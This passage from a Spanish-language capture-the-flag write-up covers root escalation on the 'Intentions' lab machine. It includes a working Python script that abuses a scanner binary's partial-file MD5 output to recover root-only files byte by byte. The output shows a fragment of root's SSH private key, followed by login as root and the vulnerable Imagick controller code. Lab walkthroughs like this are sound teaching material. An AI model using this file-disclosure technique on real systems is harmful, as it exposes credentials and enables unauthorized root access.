{: .prompt-info }

Muy bien, ¿cómo vamos a utilizar este binario para nuestro beneficio? si has leído bien el help del programa habrás visto que *también puede calcular el hash MD5 de una porción del contenido del archivo* con el parámetro `-l`

```bash
greg@intentions:~$ /opt/scanner/scanner -c /root/root.txt -l 1 -s "1"
```

No nos muestra nada, pero con el switch `-p` podemos hacer que nos liste el hash MD5 de la porción de contenido leída y como vayamos incrementando los bytes de contenido leído el hash va cambiando

```bash
greg@intentions:~$ /opt/scanner/scanner -c /root/root.txt -l 1 -p -s "1"
[DEBUG] /root/root.txt has hash e4da3b7fbbce2345d7772b0674a318d5
greg@intentions:~$ /opt/scanner/scanner -c /root/root.txt -l 2 -p -s "1"
[DEBUG] /root/root.txt has hash c467a926202625be53163e200463443e
greg@intentions:~$ /opt/scanner/scanner -c /root/root.txt -l 3 -p -s "1"
[DEBUG] /root/root.txt has hash 08568948e369d6e5901ea1052de036ac
... [snip]
```

Eso significa que podríamos hacer fuerza bruta que matemáticamente sería así; dado el alfabeto $$ Σ $$ utilizado en un archivo, cada letra $$ a \in Σ $$ tiene un hash $$ H $$ único, para un ataque de fuerza bruta por carácter se tendrían que hacer $$ S(Σ) $$ intentos por cada carácter, donde la función $$ S $$ en $$ Σ $$ denota el número de letras del alfabeto; por lo que el número de intentos total para obtener el contenido de un archivo sería representado como 

 $$ N = F^s $$

Siendo $$ F $$ el número de carácteres en el fichero y $$ s $$ el número de letras del alfabeto. Ahora, algoritmicamente solamente debemos comparar el hash $$ I $$ obtenido por  el programa por el hash de cada letra del alfabeto $$ Σ $$, cuando coincidan los hashes agregamos el carácter coincidente a un array $$ D $$, incrementamos el número de carácteres que el programa lee del archivo, se le agrega a la cadena a hashear el carácter descubierto y repetimos el proceso en forma de bucle hasta llegar al EOF y haber obtenido todo el contenido del archivo.

Esta lógica podría ser implementada en Python del siguiente modo:

```python
import hashlib
import string
import re
import os

def thing(hash, discovered):
  table = string.printable
  result = ""
  for char in table:
    t = discovered + char
    digest = hashlib.md5(t.encode('utf-8')).digest().hex()
    if hash == digest:
      result += char
      break
  return result

counter = 1
final = ""

while True:
  proc = os.popen(f"/opt/scanner/scanner -l {counter} -p -c /root/.bashrc -s asd").read()
  if proc == '': # If there's no output, the program crashed because the EOF has been surpassed
    break
  hash = proc.split(" ")[4].strip()
  char = thing(hash, final)
  final += char
  counter += 1

print(final)
```
{: file="scanner_bruteforce.py" }

> Es la primera vez que hago esto en el blog jaja
{: .prompt-info }

Ejecutando contra el fichero `.bashrc` nos devuelve el contenido en cuestión.

```bash
greg@intentions:/tmp$ python3 uwu.py
panic: runtime error: slice bounds out of range [:3108] with capacity 3107

goroutine 1 [running]:
main.loadFileHash({0x7ffef40cb834, 0xd}, 0xc24, 0x1)
	intentions/scanner/scanner.go:96 +0x1be
main.loadFileHashes({0x7ffef40cb834, 0xd}, {0x0, 0x0}, 0x4c3665?, 0x3b?)
	intentions/scanner/scanner.go:108 +0x7e
main.main()
	intentions/scanner/scanner.go:68 +0x3ac
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
[ -z "$PS1" ] && return
... [snip]
```

Probando a ver si root tiene una clave privada SSH, ¡nos la devuelve también!

```bash
greg@intentions:/tmp$ python3 uwu.py
panic: runtime error: slice bounds out of range [:2604] with capacity 2603

goroutine 1 [running]:
main.loadFileHash({0x7fff5b5a4830, 0x11}, 0xa2c, 0x1)
	intentions/scanner/scanner.go:96 +0x1be
main.loadFileHashes({0x7fff5b5a4830, 0x11}, {0x0, 0x0}, 0x4c3665?, 0x3b?)
	intentions/scanner/scanner.go:108 +0x7e
main.main()
	intentions/scanner/scanner.go:68 +0x3ac
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA5yMuiPaWPr6P0GYiUi5EnqD8QOM9B7gm2lTHwlA7FMw95/wy8JW3
HqEMYrWSNpX2HqbvxnhOBCW/uwKMbFb4LPI+EzR6eHr5vG438EoeGmLFBvhge54WkTvQyd
vk6xqxjypi3PivKnI2Gm+BWzcMi6kHI+NLDUVn7aNthBIg9OyIVwp7LXl3cgUrWM4StvYZ
ZyGpITFR/1KjaCQjLDnshZO7OrM/PLWdyipq2yZtNoB57kvzbPRpXu7ANbM8wV3cyk/OZt
... [snip]
```

Podemos copiarnosla a nuestro equipo, usarla para autenticarnos como root y finalmente tomar la última flag.

```bash
❯ chmod 600 id_rsa
❯ /usr/bin/ssh -i id_rsa root@intentions.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 13 06:43:08 PM UTC 2023

  System load:  0.064453125       Processes:             222
  Usage of /:   59.1% of 6.30GB   Users logged in:       0
  Memory usage: 16%               IPv4 address for eth0: 10.10.11.220
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

12 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

root@intentions:~# ls
root.txt  scripts
root@intentions:~# cat root.txt
5f07a8a65ee87e8e5672f40684******
```

## Extra

El código de la ruta con la instanciación de iMagick insegura es este:

```php
<?php

namespace App\Http\Controllers;
use Imagick;
use Validator;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;
use App\Models\User;
use App\Models\GalleryImage;

class AdminController extends Controller
{
    function getImage(Request $request, $id) {
        $image = GalleryImage::findOrFail($id);
        $image->url = Storage::url($image->file);
        $image->path = Storage::path($image->file);

        try {
            $i = new Imagick($image->path);
            $image->compression = $i->getImageCompression();
            $image->compressionQuality = $i->getImageCompressionQuality();
            $image->channels = $i->getImageChannelStatistics();
            $image->height = $i->getImageHeight();
            $image->width = $i->getImageWidth();
            $image->size = $i->getImageSize();
        }
        catch(\Exception $ex) {
        }

        return response()->json(['status' => 'success', 'data' => $image], 200);
    }

    //
    function modifyImage(Request $request) {
        $v = Validator::make($request->all(), [
            'path' => 'required',
            'effect' => 'required'
        ]);
        if ($v->fails())
        {
            return response()->json([
                'status' => 'error',
                'errors' => $v->errors()
            ], 422);
        }
        $path = $request->input('path');
        if(Storage::exists($path)) {
            $path = Storage::path($path);
        }
        try {
            $i = new Imagick($path);

            switch($request->input('effect')) {
                case 'charcoal':
                    $i->charcoalImage(1, 15);
                    break;
                case 'wave':
                    $i->waveImage(10, 5);
                    break;
                case 'swirl':
                    $i->swirlImage(111);
                    break;
                case 'sepia':
                    $i->sepiaToneImage(111);
                    break;
            }
            
            return "data:image/jpeg;base64," . base64_encode($i->getImageBlob());
        }
        catch(\Exception $ex) {
            return response("bad image path", 422);
        }
        
    }

    function getUsers(Request $request) {
        return User::all();
    }
}
```
{: file="AdminController.php" }

Si estaba instanciando el objeto directamente con lo que le pasamos.